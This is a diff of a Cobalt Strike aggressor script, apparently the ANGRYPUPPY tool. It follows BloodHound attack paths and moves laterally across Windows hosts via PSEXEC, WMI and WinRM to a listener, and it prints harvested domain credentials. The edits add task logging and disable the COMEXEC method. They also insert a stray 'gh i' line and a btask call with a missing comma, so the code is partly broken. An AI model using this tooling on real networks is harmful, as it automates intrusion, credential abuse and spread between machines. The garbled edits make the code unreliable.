@@ -10,6 +10,7 @@
 import org.json.* from: /Users/vysec/Desktop/Tools/ANGRYPUPPY/json/json.jar;
 include(script_resource("cypher.cna"));
 include(script_resource("utils.cna"));
+#include(script_resource("com-exec.cna"));
 
 # Parse BloodHound graph.json and add nodes
 
@@ -215,7 +216,7 @@ sub getToken {
         println("Domain: " . $domain);
         println("User: " . $user);
         println("Password: " . $password);
-
+gh i
         brev2self($currentBid);
         if ($plaintext eq $True){
             println("Using PLAIN TEXT LOGIN");
@@ -240,21 +241,26 @@ sub lateralMove {
     #PSEXEC here
     if ($psexec eq $False){
     	if ($lateralMethod eq "PSEXEC_PSH"){
+    		btask($currentBid, "PSEXEC_PSH to $nextLabel");
         	bpsexec_psh($currentBid, $nextLabel, $listener);
         }
         else if ($lateralMethod eq "WMI"){
+        	btask($currentBid, "WMI to $nextLabel");
         	bwmi($currentBid, $nextLabel, $listener);
         }
         else if ($lateralMethod eq "WINRM"){
+        	btask($currentBid "WINRM to $nextLabel");
         	bwinrm($currentBid, $nextLabel, $listener);
         }
         else if ($lateralMethod eq "PSEXEC"){
+        	btask($currentBid, "PSEXEC to $nextLabel");
         	bpsexec($currentBid, $nextLabel, $listener, "ADMIN\$");
         }
-        else {
-        	#COMEXEC
-        	com_exec_go($currentBid, $nextLabel, $listener);
-        }
+        #else {
+       # 	#COMEXEC
+       # 	btask($currentBid, "COMEXEC to $nextLabel");
+       # 	com_exec_go($currentBid, $nextLabel, $listener);
+       # }
 
         $psexec = $True;
         #bpause($1, 10000);
@@ -466,7 +472,7 @@ sub apGUI {
 	dialog_description($dialog, "Specify the JSON attack path file, listener to use and lateral movement method");
 	drow_file($dialog, "jsonFile", "JSON File: ");
 	drow_listener_stage($dialog, "listenerChoice", "Listener: ");
-	drow_combobox($dialog, "lateralMethod", "Lateral Movement: ", @("PSEXEC_PSH", "WMI", "COMEXEC","WINRM", "PSEXEC"));
+	drow_combobox($dialog, "lateralMethod", "Lateral Movement: ", @("PSEXEC_PSH", "WMI","WINRM", "PSEXEC")); #"COMEXEC"
 
 	dbutton_action($dialog, "Run");
 	dbutton_action($dialog, "Cancel");
